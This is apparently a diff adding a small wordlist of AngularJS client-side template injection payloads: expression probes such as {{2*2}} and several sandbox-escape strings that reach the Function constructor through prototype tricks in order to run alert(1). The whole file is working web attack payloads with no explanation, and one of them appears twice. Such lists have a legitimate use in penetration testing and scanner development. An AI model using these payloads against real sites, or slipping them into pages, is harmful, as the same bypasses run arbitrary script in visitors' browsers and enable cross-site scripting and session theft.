@@ -1,0 +1,15 @@
+{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}
+
+{{2*2}}
+
+{{4*4}}[[5*5]]
+
+{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
+ 
+{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}
+ 
+{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","alert(1)"].sort(c)}}
+ 
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+ 
+{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}
